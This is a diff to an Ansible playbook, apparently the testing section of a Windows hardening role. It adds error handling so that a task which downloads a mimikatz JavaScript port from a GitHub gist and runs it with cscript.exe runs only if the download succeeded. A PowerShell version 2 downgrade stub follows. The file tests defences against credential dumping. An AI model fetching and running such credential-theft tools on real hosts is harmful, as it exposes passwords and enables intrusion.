@@ -27,11 +27,14 @@
   win_get_url:
     url: https://gist.githubusercontent.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js
     dest: "{{ harden_win_temp_dir }}\\katz.js"
+  ignore_errors: true
+  register: katzdl
 
 - name: testing | call mimikatz in javascript
 # https://gist.githubusercontent.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js
   win_command: "cscript.exe {{ harden_win_temp_dir }}\\katz.js"
   ignore_errors: true
+  when: katzdl|succeeded
 
 # downgrade powershell
 # PowerShell Version 2 Command [Your Command Here]
